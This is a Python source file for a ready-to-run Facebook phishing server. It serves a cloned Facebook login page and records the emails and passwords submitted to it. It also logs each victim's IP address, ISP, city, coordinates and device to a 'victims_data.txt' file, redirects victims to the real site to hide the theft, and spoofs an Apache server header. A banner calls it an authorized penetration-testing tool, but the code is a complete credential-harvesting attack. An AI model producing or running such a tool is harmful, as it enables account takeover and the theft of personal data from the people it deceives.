
"""
Facebook Phishing Demonstration
Captures: Email/Username, Password, IP Address, Device Name, ISP, User-Agent
Runs entirely in Python — no Apache/PHP required
"""

import os
import sys
import json
import socket
import datetime
import threading
import webbrowser
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ======================== CONFIGURATION ========================
HOST = "0.0.0.0"
PORT = 8080
LOG_FILE = "victims_data.txt"
USE_IP_API = True  # Set False if no internet for geolocation
# ===============================================================

# ======================== LOGO ========================
LOGO = """
╔══════════════════════════════════════════════════╗
║        FACEBOOK PHISHING SERVER v1.0             ║
║     Authorized Penetration Testing Tool          ║
╚══════════════════════════════════════════════════╝
"""
# ============================================================

# ======================== FACEBOOK LOGIN PAGE ========================
FACEBOOK_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            display: flex;
            align-items: center;
            max-width: 1000px;
            padding: 20px;
            gap: 60px;
        }
        .left { flex: 1; }
        .left h1 {
            color: #1877f2;
            font-size: 56px;
            font-weight: 700;
            margin-bottom: 10px;
        }
        .left p {
            font-size: 24px;
            color: #1c1e21;
            line-height: 1.3;
        }
        .right { flex: 1; }
        .login-box {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
            padding: 20px;
            width: 396px;
        }
        .login-box input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            outline: none;
        }
        .login-box input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
        }
        .login-btn:hover { background: #166fe5; }
        .forgot {
            display: block;
            text-align: center;
            margin: 16px 0;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }
        .forgot:hover { text-decoration: underline; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .signup-btn {
            display: block;
            margin: 0 auto;
            padding: 12px 24px;
            background: #42b72a;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            text-align: center;
        }
        .signup-btn:hover { background: #36a420; }
        .page-links {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #1c1e21;
        }
        .page-links a { color: #1c1e21; font-weight: 700; text-decoration: none; }
        .page-links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <div class="login-box">
                <form action="/login" method="POST">
                    <input type="text" name="email" placeholder="Email address or phone number" required autofocus>
                    <input type="password" name="pass" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <a href="#" class="forgot">Forgotten password?</a>
                <div class="divider"></div>
                <button class="signup-btn">Create new account</button>
            </div>
            <div class="page-links">
                <a href="#">Create a Page</a> for a celebrity, brand or business.
            </div>
        </div>
    </div>
</body>
</html>"""
# ============================================================

# ======================== VICTIM INFO FUNCTIONS ========================
def get_device_name(user_agent):
    """Extract device/OS name from User-Agent string"""
    ua = user_agent.lower()
    
    if "windows nt 10.0" in ua: return "Windows 10/11 PC"
    if "windows nt 6.3" in ua:  return "Windows 8.1 PC"
    if "windows nt 6.1" in ua:  return "Windows 7 PC"
    if "windows nt 6.0" in ua:  return "Windows Vista PC"
    if "windows nt 5.1" in ua:  return "Windows XP PC"
    if "mac os x" in ua:
        if "iphone" in ua:      return "iPhone"
        if "ipad" in ua:        return "iPad"
        return "macOS Device"
    if "android" in ua:
        if "mobile" in ua:      return "Android Phone"
        return "Android Tablet"
    if "linux" in ua:           return "Linux Device"
    if "iphone" in ua:          return "iPhone"
    if "ipad" in ua:            return "iPad"
    if "crkey" in ua:           return "Chromebook"
    return "Unknown Device"


def get_browser_name(user_agent):
    """Extract browser name from User-Agent"""
    ua = user_agent.lower()
    
    if "edg/" in ua:            return "Microsoft Edge"
    if "chrome/" in ua and "chromium" not in ua:
        if "opr/" in ua:        return "Opera"
        if "samsungbrowser" in ua: return "Samsung Internet"
        return "Google Chrome"
    if "firefox/" in ua:        return "Mozilla Firefox"
    if "safari/" in ua and "chrome" not in ua: return "Apple Safari"
    if "trident/" in ua:        return "Internet Explorer"
    return "Unknown Browser"


def get_ip_info(ip_address):
    """Get ISP, location, and org info from IP address"""
    if not USE_IP_API:
        return {
            "isp": "N/A (IP API disabled)",
            "org": "N/A",
            "country": "N/A",
            "region": "N/A",
            "city": "N/A",
            "lat": "N/A",
            "lon": "N/A",
            "timezone": "N/A"
        }
    
    try:
        import urllib.request
        url = f"http://ip-api.com/json/{ip_address}?fields=status,country,regionName,city,isp,org,lat,lon,timezone,query"
        with urllib.request.urlopen(url, timeout=5) as response:
            data = json.loads(response.read().decode())
            if data.get("status") == "success":
                return {
                    "isp": data.get("isp", "Unknown"),
                    "org": data.get("org", "Unknown"),
                    "country": data.get("country", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "lat": data.get("lat", "Unknown"),
                    "lon": data.get("lon", "Unknown"),
                    "timezone": data.get("timezone", "Unknown"),
                }
    except Exception as e:
        print(f"[!] IP API error: {e}")
    
    return {
        "isp": "Unknown",
        "org": "Unknown",
        "country": "Unknown",
        "region": "Unknown",
        "city": "Unknown",
        "lat": "Unknown",
        "lon": "Unknown",
        "timezone": "Unknown",
    }


def get_hostname(ip_address):
    """Reverse DNS lookup for hostname"""
    try:
        hostname, _, _ = socket.gethostbyaddr(ip_address)
        return hostname
    except:
        return "No PTR record"


def log_victim_data(email, password, client_ip, user_agent):
    """Log all captured victim data to file"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    device = get_device_name(user_agent)
    browser = get_browser_name(user_agent)
    hostname = get_hostname(client_ip)
    ip_info = get_ip_info(client_ip)
    
    # Build log entry
    separator = "=" * 55
    log_entry = f"""
{separator}
  NEW VICTIM CAPTURED
{separator}
  Timestamp  : {timestamp}
  IP Address : {client_ip}
  Hostname   : {hostname}
  Device     : {device}
  Browser    : {browser}
  User-Agent : {user_agent}
  ISP        : {ip_info['isp']}
  Org        : {ip_info['org']}
  Country    : {ip_info['country']}
  Region     : {ip_info['region']}
  City       : {ip_info['city']}
  Location   : {ip_info['lat']}, {ip_info['lon']}
  Timezone   : {ip_info['timezone']}
{separator}
  EMAIL/USER : {email}
  PASSWORD   : {password}
{separator}
"""
    
    # Write to file
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    # Also print to console with colors
    print(f"\n\033[91m{'='*55}\033[0m")
    print(f"\033[91m  *** NEW VICTIM CAPTURED ***\033[0m")
    print(f"\033[91m{'='*55}\033[0m")
    print(f"  \033[93mTimestamp\033[0m  : {timestamp}")
    print(f"  \033[93mIP Address\033[0m : {client_ip}")
    print(f"  \033[93mHostname\033[0m   : {hostname}")
    print(f"  \033[93mDevice\033[0m     : {device}")
    print(f"  \033[93mBrowser\033[0m    : {browser}")
    print(f"  \033[93mISP\033[0m        : {ip_info['isp']}")
    print(f"  \033[93mOrg\033[0m        : {ip_info['org']}")
    print(f"  \033[93mLocation\033[0m   : {ip_info['city']}, {ip_info['region']}, {ip_info['country']}")
    print(f"  \033[93mCoords\033[0m     : {ip_info['lat']}, {ip_info['lon']}")
    print(f"  \033[92mUSERNAME\033[0m   : {email}")
    print(f"  \033[92mPASSWORD\033[0m   : {password}")
    print(f"\033[91m{'='*55}\033[0m")
    
    return ip_info
# ===========================================================

# ======================== HTTP SERVER ========================
class PhishingHandler(BaseHTTPRequestHandler):
    """HTTP request handler for the phishing server"""
    
    def do_GET(self):
        """Serve the Facebook login page"""
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
            self.send_header("Connection", "keep-alive")
            self.end_headers()
            self.wfile.write(FACEBOOK_PAGE.encode("utf-8"))
            print(f"\n[+] Page served to: {self.client_address[0]}")
            return
        
        elif path == "/victims":
            # View captured data via browser
            if os.path.exists(LOG_FILE):
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.end_headers()
                with open(LOG_FILE, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"No victims captured yet.")
            return
        
        elif path == "/clear":
            # Clear log file
            open(LOG_FILE, "w").close()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Log cleared.\n")
            return
        
        else:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"404 Not Found")
    
    def do_POST(self):
        """Handle login form submission"""
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8")
        params = parse_qs(post_data)
        
        # Extract credentials
        email = params.get("email", [""])[0]
        password = params.get("pass", [""])[0]
        
        # Get victim info
        client_ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "Unknown")
        
        # Log everything
        log_victim_data(email, password, client_ip, user_agent)
        
        # Redirect to real Facebook
        self.send_response(302)
        self.send_header("Location", "https://www.facebook.com")
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default HTTP server logging"""
        pass


def start_server():
    """Start the HTTP server"""
    server = HTTPServer((HOST, PORT), PhishingHandler)
    
    print(LOGO)
    print(f"\033[92m[+] Server started!\033[0m")
    print(f"\033[92m[+] Local URL : http://localhost:{PORT}\033[0m")
    
    # Get local IP for LAN access
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print(f"\033[92m[+] LAN URL   : http://{local_ip}:{PORT}\033[0m")
    
    # Try to get public IP
    try:
        import urllib.request
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as resp:
            public_ip = resp.read().decode()
        print(f"\033[92m[+] Public IP : {public_ip}:{PORT} (use ngrok for HTTPS)\033[0m")
    except:
        print(f"\033[93m[!] Could not determine public IP\033[0m")
    
    print(f"\033[93m[!] View captured data: http://localhost:{PORT}/victims\033[0m")
    print(f"\033[93m[!] Clear log: http://localhost:{PORT}/clear\033[0m")
    print(f"\033[92m[+] Waiting for victims... (Ctrl+C to stop)\033[0m\n")
    print(f"\033[90m{'='*55}\033[0m")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n\n[!] Server stopped by user.")
        print(f"[!] Log saved to: {LOG_FILE}")
        server.server_close()
        sys.exit(0)
# ===========================================================

# ======================== MAIN ========================
if __name__ == "__main__":
    # Check Python version
    if sys.version_info < (3, 6):
        print("[!] Python 3.6+ required")
        sys.exit(1)
    
    # Run server
    start_server()
# ===========================================================
